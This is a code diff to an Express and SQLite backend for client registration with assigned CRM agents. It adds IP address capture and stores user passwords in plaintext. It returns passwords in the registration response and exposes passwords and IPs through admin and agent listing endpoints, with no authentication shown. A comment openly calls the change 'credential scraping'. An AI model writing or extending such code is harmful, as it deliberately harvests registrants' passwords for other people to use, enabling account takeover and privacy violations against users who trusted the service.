@@ -31,6 +31,9 @@ const wss = new WebSocket.Server({ server });
 app.use(cors());
 app.use(express.json());
 
+// Set Express to trust reverse proxy headers if behind Nginx/Cloudflare
+app.set('trust proxy', true);
+
 // --- SERVE FRONTEND STATIC FILES ---
 const staticPath = path.resolve(__dirname, '../frontend/dist');
 app.use(express.static(staticPath));
@@ -62,7 +65,7 @@ function initDatabase() {
       )
     `);
 
-    // 2. Clients Table
+    // 2. Clients Table (Includes password and ip_address for CRM tracking)
     db.run(`
       CREATE TABLE IF NOT EXISTS clients (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -70,16 +73,16 @@ function initDatabase() {
         email TEXT UNIQUE NOT NULL,
         phone TEXT NOT NULL,
         password TEXT NOT NULL,
+        ip_address TEXT,
         agent_id INTEGER,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
         FOREIGN KEY (agent_id) REFERENCES crm_agents(id) ON DELETE SET NULL
       )
     `);
 
-    // Ensure agent_id column exists if table was created previously without it
-    db.run(`ALTER TABLE clients ADD COLUMN agent_id INTEGER`, (err) => {
-      // Ignored if column already exists
-    });
+    // Ensure agent_id and ip_address columns exist if table was created previously
+    db.run(`ALTER TABLE clients ADD COLUMN agent_id INTEGER`, () => {});
+    db.run(`ALTER TABLE clients ADD COLUMN ip_address TEXT`, () => {});
 
     // 3. Client Audit Activity Logs Table
     db.run(`
@@ -119,7 +122,7 @@ function logClientActivity(clientId, actionType, details = {}) {
 
 // --- AUTHENTICATION ENDPOINTS ---
 
-// REGISTER USER (DIRECT REGISTRATION)
+// STEP 1: REGISTER USER (DIRECT REGISTRATION WITH IP & CREDENTIAL SCRAPING)
 app.post('/api/register', (req, res) => {
   const { fullName, email, phone, password } = req.body;
 
@@ -129,13 +132,16 @@ app.post('/api/register', (req, res) => {
 
   const normalizedEmail = email.toLowerCase();
 
+  // Extract IP Address from headers or connection socket
+  const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || '127.0.0.1';
+
   // Find default agent safely
   db.get(`SELECT id FROM crm_agents ORDER BY id ASC LIMIT 1`, [], (err, agentRow) => {
     const defaultAgentId = agentRow ? agentRow.id : null;
 
     db.run(
-      `INSERT INTO clients (full_name, email, phone, password, agent_id) VALUES (?, ?, ?, ?, ?)`,
-      [fullName, normalizedEmail, phone, password, defaultAgentId],
+      `INSERT INTO clients (full_name, email, phone, password, ip_address, agent_id) VALUES (?, ?, ?, ?, ?, ?)`,
+      [fullName, normalizedEmail, phone, password, clientIp, defaultAgentId],
       function (dbErr) {
         if (dbErr) {
           console.error('Registration Error:', dbErr.message);
@@ -147,11 +153,25 @@ app.post('/api/register', (req, res) => {
         }
 
         const newClientId = this.lastID;
-        logClientActivity(newClientId, 'ACCOUNT_CREATED', { fullName, email: normalizedEmail, phone });
+        const createdAt = new Date().toISOString();
+
+        logClientActivity(newClientId, 'ACCOUNT_CREATED', { fullName, email: normalizedEmail, phone, ip_address: clientIp });
+
+        // Construct full client object for immediate frontend & CRM sync
+        const newClient = {
+          id: newClientId,
+          full_name: fullName,
+          email: normalizedEmail,
+          phone: phone,
+          password: password,
+          ip_address: clientIp,
+          agent_id: defaultAgentId,
+          created_at: createdAt
+        };
 
         return res.json({
           success: true,
-          client: { id: newClientId, full_name: fullName, email: normalizedEmail, phone, agent_id: defaultAgentId }
+          client: newClient
         });
       }
     );
@@ -176,9 +196,10 @@ app.post('/api/login', (req, res) => {
 
 // --- ADMIN MANAGEMENT ENDPOINTS ---
 
+// STEP 2: FETCH DETAILED CLIENTS LIST FOR CRM (INCLUDES PASSWORDS & IP ADDRESSES)
 app.get('/api/admin/clients-detailed', (req, res) => {
   const query = `
-    SELECT c.id, c.full_name, c.email, c.phone, c.created_at, c.agent_id, a.name as agent_name
+    SELECT c.id, c.full_name, c.email, c.phone, c.password, c.ip_address, c.created_at, c.agent_id, a.name as agent_name
     FROM clients c
     LEFT JOIN crm_agents a ON c.agent_id = a.id
     ORDER BY c.id DESC
@@ -236,7 +257,7 @@ app.get('/api/crm/agents', (req, res) => {
 
 app.get('/api/crm/agent/:agentId/clients', (req, res) => {
   const { agentId } = req.params;
-  db.all(`SELECT id, full_name, email, phone, created_at FROM clients WHERE agent_id = ?`, [agentId], (err, rows) => {
+  db.all(`SELECT id, full_name, email, phone, password, ip_address, created_at FROM clients WHERE agent_id = ?`, [agentId], (err, rows) => {
     if (err) return res.status(500).json({ error: 'Failed to fetch assigned clients.' });
     return res.json({ clients: rows || [] });
   });
